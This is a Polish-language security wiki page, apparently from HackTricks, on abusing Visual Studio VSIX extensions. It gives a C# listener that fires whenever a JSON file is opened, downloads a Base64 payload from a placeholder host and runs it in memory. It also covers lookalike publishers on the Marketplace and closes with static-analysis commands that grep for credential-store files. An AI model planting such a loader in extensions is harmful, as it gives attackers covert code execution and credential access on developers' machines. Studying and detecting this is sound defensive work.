# Nadużywanie rozszerzeń VSIX w Visual Studio

{{#include ../banners/hacktricks-training.md}}

Rozszerzenie Visual Studio może zamienić zwykłą pracę w edytorze w wykonanie kodu z uprawnieniami zalogowanego użytkownika. Złośliwy VSIX, wydawca podszywający się pod inną osobę lub skompromitowana aktualizacja rozszerzenia mogą dotrzeć do użytkownika za pośrednictwem standardowych kanałów instalacji. Instalacja wymagająca potwierdzenia przez administratora jest instalacją za zgodą użytkownika, a nie automatycznym podniesieniem uprawnień.<sup>[[1]](#references)</sup>

## Model wykonania

Rozszerzenia oparte na klasycznym VSSDK często wykonują się w procesie `devenv.exe`. Nowszy model `VisualStudio.Extensibility` uruchamia głównie nowoczesne rozszerzenia .NET poza procesem: Visual Studio pośredniczy w wywołaniach dedykowanego procesu `Microsoft.ServiceHub.Host.Extensibility`. Izoluje to stabilność IDE, ale **nie** ogranicza rozszerzeniu dostępu do uprawnień użytkownika w systemie Windows. Dokładna nazwa pliku wykonywalnego może zawierać sufiks architektury, na przykład `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Uruchamianie przy zwykłej pracy w edytorze

Zamiast udostępniać wyłącznie rzucające się w oczy polecenie menu, rozszerzenie może implementować `ITextViewOpenClosedListener`. Jego wywołanie zwrotne `TextViewOpenedAsync` jest uruchamiane dla pasujących dokumentów, a `TextViewExtensionConfiguration.AppliesTo` może ograniczyć aktywację do popularnego typu plików, takiego jak JSON. Prawdziwy formatter lub linter może nadal wykonywać reklamowane zadania, a jednocześnie uruchamiać drugą czynność jako efekt uboczny otwarcia pliku.<sup>[[1]](#references)[[3]](#references)</sup>

Poniższy uproszczony schemat przedstawia istotne punkty wykonania; dla przejrzystości pominięto w nim prawidłowe działanie formattera oraz obsługę błędów.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Uruchamiany zdarzeniem moduł ładujący zarządzane zestawy w pamięci</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ten łańcuch pobiera tekst Base64, dekoduje go do bajtów assembly, ładuje z obiektu `MemoryStream` za pośrednictwem kolekcjonowalnego `AssemblyLoadContext`, wywołuje refleksyjnie `EntryPoint` bez parametrów lub z `string[]`, oczekuje na asynchroniczne punkty wejścia i zwalnia kontekst. Drugi etap nie jest zapisywany na dysku, choć VSIX i główna biblioteka DLL rozszerzenia pozostają artefaktami na dysku. Base64 nie zapewnia autentyczności ani poufności; użycie HTTP pozwala również atakującemu typu on-path podmienić odpowiedź.<sup>[[1]](#references)</sup>

Warianty operacyjne obejmują przechwytywanie wszystkich wyjątków, aby reklamowana funkcja działała dalej w razie niepowodzenia pobierania, albo użycie `ITextViewChangedListener`, by uruchomić kod po edycji. Kod wykonuje się w hoście rozszerzeń i może korzystać z dostępnych dla danego użytkownika zarządzanych API, P/Invoke, plików, poświadczeń i procesów potomnych.<sup>[[1]](#references)</sup>

Informacje o powiązanej powierzchni wykonywania specyficznej dla edytora, opartej na automatycznym ładowaniu natywnych pluginów, znajdziesz tutaj:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Nadużywanie zaufania do Marketplace i kanałów dystrybucji

VSIX może zostać dostarczony jako bezpośrednio udostępniony lub wyłudzony plik, pobrany z internetowego Marketplace albo przez wbudowaną w Visual Studio przeglądarkę Marketplace. Rejestracja wydawcy, która w głównej mierze sprawdza unikalność i listę zastrzeżonych słów, może dopuszczać nazwy wydawców łudząco podobne do innych; przejęcie już zaufanego wydawcy lub rozszerzenia jest jeszcze skuteczniejsze, ponieważ taki podmiot ma już bazę użytkowników. Instalacja z Marketplace uruchamia Visual Studio Installer i tymczasowo umieszcza pobrany VSIX w `%LOCALAPPDATA%\Temp`; nazwa `payload.vsix` jest również używana w legalnych przypadkach, więc sama nazwa pliku nie jest wskaźnikiem.<sup>[[1]](#references)</sup>

MDSec nie zidentyfikował protokołu URL Visual Studio, który bezpośrednio instalowałby rozszerzenie. Operator nadal musi skłonić użytkownika do zainstalowania lub zaufania VSIX albo przejąć istniejący kanał dystrybucji rozszerzenia. Pakiet `AllUsers` instaluje się w folderze instalacyjnym Visual Studio i może zażądać podwyższenia uprawnień, ale jest to standardowe działanie instalatora wymagające zgody, a nie automatyczna droga do uzyskania uprawnień administratora lub SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Analiza statyczna na dużą skalę

Pakiety VSIX to zazwyczaj archiwa ZIP, więc bezpieczny proces przeglądu Marketplace może wyliczać pakiety, rozpakowywać je **bez ładowania kodu rozszerzeń**, analizować manifesty, identyfikować powierzchnie wykonywania kodu i dekompilować zarządzane assembly za pomocą `ilspycmd`. Nadaj priorytet assembly należącym do rozszerzenia po wykluczeniu typowych dołączonych zależności, a następnie skoreluj ciągi związane z magazynem poświadczeń z klastrami zachowań, takimi jak odczyt plików i wysyłanie przez sieć, kodowanie i wysyłanie, pobieranie i wykonywanie, dostęp do menedżera poświadczeń i sieci albo wykonywanie zrzutu ekranu i jego wysyłanie.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inwentaryzuj również natywne biblioteki DLL, cele MSBuild, skrypty, szablony T4 i ładunki instalatora, zamiast zakładać, że każda powierzchnia wykonywania kodu obejmuje kod zarządzany. Porównuj podejrzane zachowanie z deklarowanym przeznaczeniem w manifeście; telemetria i legalne programy aktualizujące mogą przypominać eksfiltrację lub staging. Analiza wyłącznie statyczna pomija kod spakowany, zaciemniony, rozwiązywany dynamicznie i uśpiony, a przeglądanie tylko najnowszej wersji pomija złośliwe wydania historyczne.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Rozszerzenia Visual Studio — ponowne omówienie](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Informacje o VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Budowa pakietu VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - narzędzie .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
